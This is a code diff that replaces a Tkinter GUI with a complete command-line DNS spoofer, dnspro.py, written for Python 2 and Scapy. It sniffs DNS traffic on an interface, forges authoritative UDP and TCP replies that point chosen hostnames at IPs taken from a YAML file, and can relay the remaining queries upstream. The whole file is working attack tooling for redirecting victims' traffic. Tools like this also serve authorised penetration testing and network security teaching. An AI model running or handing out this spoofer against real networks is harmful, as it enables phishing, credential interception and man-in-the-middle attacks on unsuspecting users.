@@ -1,166 +1,209 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
 """
-DNS Spoofer GUI (Python 2.7 only)
-Provides a Tkinter-based interface to the local dns.py DNS spoofing tool.
+dnspro.py -- DNS spoof / relay for Python-2.7 + Scapy-2.4.5
+This script intercepts DNS queries on an interface, spoofs answers for
+matched hostnames according to a YAML mapping, and optionally relays
+unmatched queries to an upstream resolver.
+
 Requires root privileges (e.g. sudo) to run.
 """
+
+from __future__ import print_function, absolute_import
+
+import argparse
+# backport for Python 2.7
+try:
+    import ipaddress
+except ImportError:
+    sys.exit("Install the 'ipaddress' back-port: sudo pip install ipaddress")
+import logging
+import os
+import signal
+import socket
 import sys
 import threading
-import logging
-import yaml
+import time
 
-# Tkinter imports for Python2
-import Tkinter as tk
-import tkFileDialog as filedialog
-import tkMessageBox as messagebox
-
-# Scapy interface enumeration
-from scapy.all import get_if_list
-
-# Locate local dns.py module
-import os
-script_dir = os.path.dirname(os.path.abspath(__file__))
-dns_path = os.path.join(script_dir, 'dns.py')
-if script_dir not in sys.path:
-    sys.path.insert(0, script_dir)
-
-# Load local dns.py via imp
+# YAML mapping loader
 try:
-    import imp
-    dns_mod = imp.load_source('local_dns', dns_path)
-except Exception as e:
-    messagebox.showerror("Import Error", "Failed to load dns.py: %s" % e)
-    sys.exit(1)
+    import yaml
+except ImportError:
+    sys.exit("Install PyYAML for Python 2: sudo pip2 install 'PyYAML<5.4'")
 
-DNSSpoofer = dns_mod.DNSSpoofer
-load_mapping = dns_mod.load_mapping
+# Scapy imports
+from scapy.all import (
+    DNS, DNSQR, DNSRR,
+    IP, IPv6,
+    UDP, TCP,
+    send, sniff,
+)
 
-class GUIHandler(logging.Handler):
-    """Custom logging handler to redirect logs to a Tkinter Text widget."""
-    def __init__(self, text_widget):
-        logging.Handler.__init__(self)
-        self.text_widget = text_widget
+# Helpers
 
-    def emit(self, record):
-        msg = self.format(record) + '\n'
-        def append():
-            self.text_widget.insert(tk.END, msg)
-            self.text_widget.see(tk.END)
-        self.text_widget.after(0, append)
+def _u(s):
+    # Ensure unicode under Py2
+    try:
+        return unicode(s)
+    except NameError:
+        return s
 
-class DNSGui(tk.Frame):
-    def __init__(self, master=None):
-        tk.Frame.__init__(self, master)
-        master.title("DNS Spoofer GUI")
-        self.spoofer = None
-        self._build_widgets()
+# normalize hostname
 
-    def _build_widgets(self):
-        row = 0
-        tk.Label(self, text="Interface:").grid(row=row, column=0, sticky='e')
-        self.iface_var = tk.StringVar()
-        self.iface_menu = tk.OptionMenu(self, self.iface_var, *get_if_list())
-        self.iface_menu.grid(row=row, column=1, sticky='w')
+def _normalise_qname(name):
+    return _u(name).rstrip('.') .lower()
 
-        row += 1
-        tk.Label(self, text="Mapping file:").grid(row=row, column=0, sticky='e')
-        self.map_path = tk.Entry(self, width=40)
-        self.map_path.grid(row=row, column=1)
-        tk.Button(self, text="Browse...", command=self._browse_map).grid(row=row, column=2)
+class DNSSpoofer(threading.Thread):
+    """Thread that handles DNS spoofing over UDP and TCP."""
+    def __init__(self, iface, mapping, upstream='8.8.8.8', relay=False, ttl=300, bpf=None):
+        threading.Thread.__init__(self)
+        self.daemon = True
+        self.iface = iface
+        self.mapping = mapping
+        self.upstream = upstream
+        self.relay = relay
+        self.ttl = ttl
+        self.bpf = bpf or 'udp or tcp port 53'
+        self._running = threading.Event()
+        self._running.set()
+        self._tcp_thr = None
 
-        row += 1
-        self.relay_var = tk.BooleanVar()
-        tk.Checkbutton(self, text="Relay unmatched queries", variable=self.relay_var).grid(row=row, columnspan=3, sticky='w')
+    def _lookup(self, qname):
+        qn = _normalise_qname(qname)
+        if qn in self.mapping:
+            val = self.mapping[qn]
+            return val if isinstance(val, list) else [val]
+        for pattern, val in self.mapping.items():
+            if pattern.startswith('*.') and qn.endswith(pattern[2:]):
+                return val if isinstance(val, list) else [val]
+        return None
 
-        row += 1
-        tk.Label(self, text="Upstream DNS:").grid(row=row, column=0, sticky='e')
-        self.upstream = tk.Entry(self)
-        self.upstream.insert(0, "8.8.8.8")
-        self.upstream.grid(row=row, column=1, sticky='w')
+    def _build_answers(self, qname, ips, qtype):
+        answers = None
+        for ip in ips:
+            rr = DNSRR(rrname=qname, type=qtype, ttl=self.ttl, rdata=str(ip))
+            answers = rr if answers is None else answers / rr
+        return answers
 
-        row += 1
-        tk.Label(self, text="TTL (secs):").grid(row=row, column=0, sticky='e')
-        self.ttl = tk.Spinbox(self, from_=1, to=3600)
-        self.ttl.delete(0, tk.END)
-        self.ttl.insert(0, "300")
-        self.ttl.grid(row=row, column=1, sticky='w')
+    def _forge_response(self, pkt, ips):
+        q = pkt[DNSQR]
+        answer = self._build_answers(q.qname, ips, q.qtype)
+        dns = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=q, ancount=len(ips), an=answer)
+        if IP in pkt:
+            ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+        else:
+            ip_layer = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
+        if UDP in pkt:
+            udp = UDP(sport=53, dport=pkt[UDP].sport)
+            return ip_layer / udp / dns
+        else:
+            tcp = TCP(sport=53, dport=pkt[TCP].sport,
+                      flags='PA', seq=pkt[TCP].ack,
+                      ack=pkt[TCP].seq + len(pkt[TCP].payload))
+            return ip_layer / tcp / dns
 
-        row += 1
-        tk.Label(self, text="BPF filter:").grid(row=row, column=0, sticky='e')
-        self.bpf = tk.Entry(self)
-        self.bpf.grid(row=row, column=1, sticky='w')
-
-        row += 1
-        tk.Label(self, text="Log level:").grid(row=row, column=0, sticky='e')
-        self.log_level = tk.StringVar()
-        self.log_level.set('INFO')
-        tk.OptionMenu(self, self.log_level, 'DEBUG', 'INFO', 'ERROR').grid(row=row, column=1, sticky='w')
-
-        row += 1
-        self.start_btn = tk.Button(self, text="Start", command=self._start)
-        self.start_btn.grid(row=row, column=0)
-        self.stop_btn = tk.Button(self, text="Stop", command=self._stop, state='disabled')
-        self.stop_btn.grid(row=row, column=1)
-
-        row += 1
-        tk.Label(self, text="Log output:").grid(row=row, columnspan=3)
-        row += 1
-        self.log_text = tk.Text(self, height=15, width=70)
-        self.log_text.grid(row=row, columnspan=3)
-
-        self.grid(padx=10, pady=10)
-
-    def _browse_map(self):
-        path = filedialog.askopenfilename(filetypes=[('YAML', '*.yml;*.yaml'), ('All files','*.*')])
-        if path:
-            self.map_path.delete(0, tk.END)
-            self.map_path.insert(0, path)
-
-    def _start(self):
-        iface = self.iface_var.get()
-        if not iface:
-            messagebox.showerror("Error", "Please select a network interface.")
+    def _process_udp(self, pkt):
+        if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
             return
-        mapfile = self.map_path.get()
-        if not mapfile:
-            messagebox.showerror("Error", "Please select a YAML mapping file.")
-            return
+        qname = pkt[DNSQR].qname.decode()
+        ips = self._lookup(qname)
+        if ips:
+            send(self._forge_response(pkt, ips), iface=self.iface, verbose=0)
+            logging.info('Spoofed %s -> %s', qname, ','.join(ips))
+        elif self.relay:
+            self._relay_upstream(pkt)
+
+    def _process_tcp(self, pkt):
+        self._process_udp(pkt)
+
+    def _relay_upstream(self, pkt):
+        qname = pkt[DNSQR].qname.decode()
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(2)
         try:
-            mapping = load_mapping(mapfile)
-        except Exception as e:
-            messagebox.showerror("Mapping Error", str(e))
+            sock.sendto(bytes(pkt[DNS]), (self.upstream, 53))
+            data, _ = sock.recvfrom(4096)
+        except socket.timeout:
+            logging.warning('Upstream timeout for %s', qname)
             return
+        finally:
+            sock.close()
+        ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+        udp_layer = UDP(sport=53, dport=pkt[UDP].sport)
+        send(ip_layer / udp_layer / DNS(data), iface=self.iface, verbose=0)
 
-        level = getattr(logging, self.log_level.get(), logging.INFO)
-        logging.basicConfig(level=level, format="%(asctime)s %(message)s")
-        handler = GUIHandler(self.log_text)
-        handler.setFormatter(logging.Formatter("%(asctime)s %(message)s"))
-        logging.getLogger().addHandler(handler)
+    def run(self):
+        logging.info('Starting DNS spoofing on %s relay=%s filter="%s"',
+                     self.iface, self.relay, self.bpf)
+        self._tcp_thr = threading.Thread(target=lambda: sniff(
+            iface=self.iface,
+            filter='tcp and (%s)' % self.bpf,
+            prn=self._process_tcp,
+            store=0,
+            stop_filter=lambda *_: not self._running.is_set(),
+        ))
+        self._tcp_thr.daemon = True
+        self._tcp_thr.start()
+        sniff(iface=self.iface,
+              filter='udp and (%s)' % self.bpf,
+              prn=self._process_udp,
+              store=0,
+              stop_filter=lambda *_: not self._running.is_set())
 
-        self.spoofer = DNSSpoofer(
-            iface=iface,
-            mapping=mapping,
-            upstream=self.upstream.get(),
-            relay=self.relay_var.get(),
-            ttl=int(self.ttl.get()),
-            bpf=self.bpf.get() or None,
-        )
-        self.spoofer.start()
+    def stop(self):
+        self._running.clear()
+        if self._tcp_thr:
+            self._tcp_thr.join(0.5)
 
-        self.start_btn.config(state='disabled')
-        self.stop_btn.config(state='normal')
-        logging.info("DNS Spoofer started on %s", iface)
 
-    def _stop(self):
-        if self.spoofer:
-            self.spoofer.stop()
-            logging.info("DNS Spoofer stopping…")
-            self.spoofer = None
-        self.start_btn.config(state='normal')
-        self.stop_btn.config(state='disabled')
+def load_mapping(path):
+    raw = yaml.safe_load(open(path, 'rb'))
+    if not isinstance(raw, dict):
+        raise ValueError('YAML must be a host→IP dictionary')
+    mapping = {}
+    for host, value in raw.items():
+        key = _normalise_qname(host)
+        ips = value if isinstance(value, list) else [value]
+        valid = []
+        for ip in ips:
+            try:
+                ipaddress.ip_address(_u(ip))
+                valid.append(str(ip))
+            except Exception:
+                logging.warning('Ignoring invalid IP %s for host %s', ip, key)
+        if valid:
+            mapping[key] = valid if len(valid)>1 else valid[0]
+    return mapping
+
+
+def setup_logging(verbose, quiet):
+    lvl = logging.DEBUG if verbose else (logging.ERROR if quiet else logging.INFO)
+    logging.basicConfig(level=lvl, format='%(asctime)s %(levelname).1s: %(message)s')
+
+
+def main():
+    parser = argparse.ArgumentParser(description='dnspro.py for Python2 + Scapy')
+    parser.add_argument('-i','--iface', required=True)
+    parser.add_argument('-m','--map', required=True)
+    parser.add_argument('--relay', action='store_true')
+    parser.add_argument('--upstream', default='8.8.8.8')
+    parser.add_argument('--ttl', type=int, default=300)
+    parser.add_argument('--bpf')
+    parser.add_argument('-v','--verbose', action='store_true')
+    parser.add_argument('-q','--quiet', action='store_true')
+    args = parser.parse_args()
+    setup_logging(args.verbose, args.quiet)
+    try:
+        mapping = load_mapping(args.map)
+    except Exception as e:
+        logging.error(str(e)); sys.exit(1)
+    if not mapping:
+        logging.error('No valid mappings'); sys.exit(1)
+    sp = DNSSpoofer(args.iface, mapping, upstream=args.upstream,
+                    relay=args.relay, ttl=args.ttl, bpf=args.bpf)
+    sp.start()
+    signal.signal(signal.SIGINT, lambda *_: sp.stop())
+    sp.join()
 
 if __name__ == '__main__':
-    root = tk.Tk()
-    app = DNSGui(master=root)
-    app.mainloop()
+    main()
